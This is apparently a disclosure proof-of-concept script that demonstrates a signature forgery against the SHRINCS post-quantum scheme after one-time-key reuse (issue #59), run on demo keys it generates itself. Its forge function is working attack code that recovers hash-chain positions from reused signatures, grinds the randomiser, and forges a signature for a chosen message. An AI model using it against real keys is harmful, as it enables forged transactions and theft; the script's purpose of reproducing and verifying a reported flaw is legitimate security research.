#!/usr/bin/env python3
"""
One-time-key-reuse forgery against SHRINCS (issue #59).

Reproduces the consequence of the cache-rollback defect tracked as
SHRINCS/shrincs-bip #59 and AppliedPQC/pqc-research#38. From only the public key
and k>=2 honest signatures that a rollback made land on the SAME FXMSS leaf, it
forges --- with no secret key --- a SHRINCS signature on a never-signed message
that the upstream reference verifier accepts. It writes forged-job.json and
control-job.json so `cargo run --example interop -- verify` shows AppliedPQC's
Rust verifier accepts the identical bytes.

Usage:
    ./forge.py [--repo DIR] [--reuse-k K] [--depth D] [--out DIR]

With no --repo it clones https://github.com/SHRINCS/shrincs-bip into a temporary
directory, exactly as regenerate-kat.py does.

Why it works. A WOTS+C signature opens each of the 32 hash chains at position
indexes[i], and the verifier only walks chains FORWARD. Across k reuses the
attacker learns every chain at m_i = min_k indexes[i], so it can open any
constant-sum target c with c_i >= m_i. `shrincs_verify` reads the randomiser R
and the 2-byte grind counter straight from the signature with no PRF check, so
the attacker grinds (R, counter) offline until the induced target dominates m.
The Merkle authentication path is identical for a fixed leaf and copied verbatim.
"""
import argparse, json, os, secrets, subprocess, sys, tempfile, time

UPSTREAM = "https://github.com/SHRINCS/shrincs-bip"

def load(repo):
    sys.path.insert(0, os.path.join(repo, "impl"))
    import shrincs
    commit = subprocess.check_output(
        ["git", "-C", repo, "rev-parse", "HEAD"], text=True).strip()
    return shrincs, commit

def bound_message(S, ctx, sl_root, message):
    return (0).to_bytes(1) + len(ctx).to_bytes(1) + ctx + sl_root + message

def adrs(lh, li):
    A = bytearray(22); A[0] = lh; A[1:9] = li.to_bytes(8); return A

def parse_sf_sig(S, sig):
    lh = sig[0]; depth = S.FXMSS_HEIGHT - lh
    R = sig[1:17]; lisz = S.ceildiv(min(depth, 64), 8)
    li = int.from_bytes(sig[17:17+lisz]); fx = sig[17+lisz:]
    counter = int.from_bytes(fx[0:2])
    cc = S.WOTS_C_CHAIN_COUNT
    chains = [fx[2+i*16:2+(i+1)*16] for i in range(cc)]
    auth = fx[2+cc*16:]
    return lh, li, R, lisz, counter, chains, auth

def forge(S, pubkey, ctx, reused_sigs, reused_msgs, target, report):
    cc, cb, cs = S.WOTS_C_CHAIN_COUNT, S.WOTS_C_CHAIN_BITS, S.WOTS_C_CONSTANT_SUM
    wmax = (1 << cb) - 1
    pk_seed, sl_root, sf_root = pubkey[0:16], pubkey[16:32], pubkey[32:48]

    # 1. Recover each chain at m_i = min over reused signatures.
    lh = li = lisz = auth = None
    m = [wmax + 1] * cc; owned = [None] * cc
    for sig, msg in zip(reused_sigs, reused_msgs):
        lh, li, R, lisz, ctr, chains, auth = parse_sf_sig(S, sig)
        md = S.H_msg_sf(R, pk_seed, sf_root, adrs(lh, li),
                        bound_message(S, ctx, sl_root, msg))
        idx = S.wots_c_map_digest(pk_seed, md, adrs(lh, li), ctr)
        assert idx is not None
        for i in range(cc):
            if idx[i] < m[i]:
                m[i] = idx[i]; owned[i] = chains[i]
    report(f"  recovered chains at min positions; sum(m) = {sum(m)} (target {cs})")

    # 2. Grind (R, counter) until the induced target dominates m.
    A = adrs(lh, li); tries = 0; t0 = time.time()
    while True:
        R = secrets.token_bytes(16)
        md = S.H_msg_sf(R, pk_seed, sf_root, A,
                        bound_message(S, ctx, sl_root, target))
        gA = bytearray(22); gA[:] = A; gA[9] = S.SF_WOTS_C_GRIND
        for counter in range(1 << 16):
            tries += 1
            c = S.base_2b(S.H_grind(pk_seed, gA, md, counter), cb, cc)
            if sum(c) != cs or any(c[i] < m[i] for i in range(cc)):
                continue
            report(f"  dominating target after {tries:,} grind attempts "
                   f"({time.time()-t0:.1f}s)")
            # 3. Walk each owned node forward from m_i to c_i and reassemble.
            sig_chains = [b''] * cc
            for i in range(cc):
                A[14:18] = i.to_bytes(4)
                sig_chains[i] = S.wots_c_chain_iter(owned[i], m[i], c[i]-m[i], pk_seed, A)
            fx = counter.to_bytes(2) + b''.join(sig_chains) + auth
            return bytes([lh]) + R + li.to_bytes(lisz) + fx

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--repo", help="an existing checkout of the draft repository")
    ap.add_argument("--reuse-k", type=int, default=int(os.environ.get("REUSE_K", "4")))
    ap.add_argument("--depth", type=int, default=int(os.environ.get("DEPTH", "6")))
    ap.add_argument("--out", default=os.path.dirname(os.path.abspath(__file__)))
    args = ap.parse_args()

    with tempfile.TemporaryDirectory() as tmp:
        repo = args.repo
        if not repo:
            repo = os.path.join(tmp, "shrincs-bip")
            print(f"cloning {UPSTREAM} ...")
            subprocess.check_call(["git", "clone", "-q", UPSTREAM, repo])
        S, commit = load(repo)
        print(f"upstream shrincs-bip {commit[:10]}, leaf reused k={args.reuse_k}, "
              f"BXMSS depth={args.depth}")

        seed = bytes(range(48))
        sf_structure = bytes([S.FXMSS_SHAPE_BALANCED, args.depth])
        sk, pk = S.shrincs_keygen(seed, sf_structure)
        ctx = b"ctx-demo"

        # The #59 rollback outcome: one leaf signs k messages at the same state_ctr.
        victim_ctr = 2
        msgs = [f"victim message #{j}".encode() for j in range(args.reuse_k)]
        sigs = [S.shrincs_sign(mm, ctx, sk, victim_ctr, None) for mm in msgs]
        for mm, ss in zip(msgs, sigs):
            assert S.shrincs_verify(mm, ss, ctx, pk)
        print(f"collected {args.reuse_k} honest signatures on the SAME leaf "
              f"(state_ctr={victim_ctr})")

        target = b"ATTACKER-CHOSEN: pay 1000 BTC to the attacker"
        assert target not in msgs
        print(f"forging on a NEVER-SIGNED message: {target!r}")
        forged = forge(S, pk, ctx, sigs, msgs, target, print)

        ok = S.shrincs_verify(target, forged, ctx, pk)
        print(f"[upstream Python shrincs_verify] forged accepted: {ok}")
        if not ok:
            sys.exit("FORGERY FAILED against upstream Python")

        # A 1-bit tamper of the forgery must be rejected (non-vacuous control).
        bad = bytearray(forged); bad[40] ^= 1
        assert not S.shrincs_verify(target, bytes(bad), ctx, pk)

        meta = {"upstream_commit": commit, "reuse_k": args.reuse_k, "depth": args.depth}
        for name, sig in [("forged-job.json", forged), ("control-job.json", bytes(bad))]:
            job = [{"msg": target.hex(), "ctx": ctx.hex(),
                    "pubkey": pk.hex(), "sig": sig.hex(), "_meta": meta}]
            open(os.path.join(args.out, name), "w").write(json.dumps(job) + "\n")
        print(f"wrote forged-job.json (accept) and control-job.json (reject) to {args.out}")

if __name__ == "__main__":
    main()
